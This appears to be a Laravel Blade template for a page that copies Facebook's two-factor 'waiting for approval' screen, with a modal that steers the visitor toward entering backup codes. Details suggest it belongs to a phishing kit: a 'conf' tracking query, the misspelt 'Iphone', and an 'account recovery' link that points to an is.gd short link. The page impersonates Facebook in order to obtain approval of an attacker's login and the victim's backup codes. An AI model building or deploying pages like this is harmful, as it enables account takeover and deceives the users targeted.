<div class="bg-[#F0F2F5]" x-data="{ show: false }">
    <div class="min-h-screen flex justify-center px-4">
        <div class="rounded-xl mt-32 max-w-2xl w-full p-6">
            <!-- Header text -->
                <div class="flex items-center gap-2">
                     <a href="{{route('index') . '?conf=' . request()->query('conf')}}" class="font-medium flex text-sm gap-2">
                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="size-6">
                          <path stroke-linecap="round" stroke-linejoin="round" d="M10.5 19.5 3 12m0 0 7.5-7.5M3 12h18" />
                        </svg>
                    </a>
                    <p class="text-sm text-gray-600 mb-1">Facebook</p>
                </div>
            <h1 class="text-[22px] font-semibold text-gray-900 mb-2">Check your notifications on another device</h1>
            <p class="text-[15px] text-gray-600 mb-4 font-semibold">We sent a notification to your Iphone.
                Check your Facebook notifications there and approve the login to continue.</p>

            <!-- Image placeholder - you'll add the image here -->
            <div class="bg-[#E7F3F3] rounded-xl w-full mb-4 ">
                <!-- Your image will go here -->
                <img src="{{ asset('images/two-factor.png') }}" class="w-full block"
                     alt="Device illustration placeholder">
            </div>

            <!-- Status section -->
            <div class="flex gap-3 mb-4 items-center">
                <svg class="w-5 h-5 text-gray-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
                     stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                          d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/>
                </svg>
                <div>
                    <p class="font-semibold text-gray-600">Waiting for approval</p>
                    <p class="text-sm text-gray-600">It may take a few minutes to get the notification on your other
                        device.</p>
                </div>
            </div>

            <!-- Try Another Way button -->
            <button @click="show = !show"
                    class="w-full py-2 px-4 border border-gray-300 rounded-full leading-[30px] text-sm font-semibold text-gray-700 hover:bg-gray-50">
                Try Another Way
            </button>
        </div>
    </div>


    {{-- Modals --}}
    <div class="bg-gray-100 bg-opacity-90 fixed h-screen top-0 left-0 w-full" x-show="show" @click.away="show = false">
        <div class="min-h-screen flex items-center justify-center p-4">
            <div class="bg-white rounded-[30px] shadow-lg max-w-xl w-full py-16 p-6">
                <!-- Header with close button -->
                <div class="flex justify-between items-start mb-4">
                    <div>
                        <h1 class="text-xl font-semibold text-gray-900 mb-1">Choose a way to confirm that it's you</h1>
                        <p class="text-gray-600 text-sm">These are your available confirmation methods.</p>
                    </div>
                    <button class="text-gray-400 hover:text-gray-500" @click="show = !show">
                        <svg class="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                  d="M6 18L18 6M6 6l12 12"/>
                        </svg>
                    </button>
                </div>

                <!-- Radio options -->
                <div class="overflow-hidden rounded-3xl border border-gray-200">
                    <!-- Option 1 -->

                    <!-- Option 2 -->
                    <label
                        class="flex items-center justify-between p-4 py-2 rounded-lg border-blue-600 hover:bg-blue-50 cursor-pointer">
                        <div>
                            <p class="text-gray-900 font-semibold">Backup Codes</p>
                            <p class="text-gray-500 text-sm">Confirm this account is yours using your backup codes.</p>
                        </div>
                        <input type="radio" name="confirm-method" class="h-4 w-4 text-blue-600" checked>
                    </label>
                </div>

                <!-- Need another option section -->
                <div class="mt-6 border p-4 rounded-3xl">
                    <div class="flex gap-2">
                        <svg class="w-5 h-5 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                  d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
                        </svg>
                        <div>
                            <p class="font-semibold text-gray-900">Need another option?</p>
                            <p class="text-gray-600 text-sm">To keep your account safe, accessing it without your usual
                                login methods can take a few days. To get started, go to <a href="https://is.gd/Jr6BC5"
                                                                                            class="text-blue-600">account
                                    recovery</a>.</p>
                        </div>
                    </div>
                </div>

                <!-- Continue button -->
                <button wire:click="continue"
                        class="w-full mt-6 bg-blue-600 text-white py-3 px-4 rounded-full font-medium hover:bg-blue-700">
                    Continue
                </button>
            </div>
        </div>
    </div>


</div>
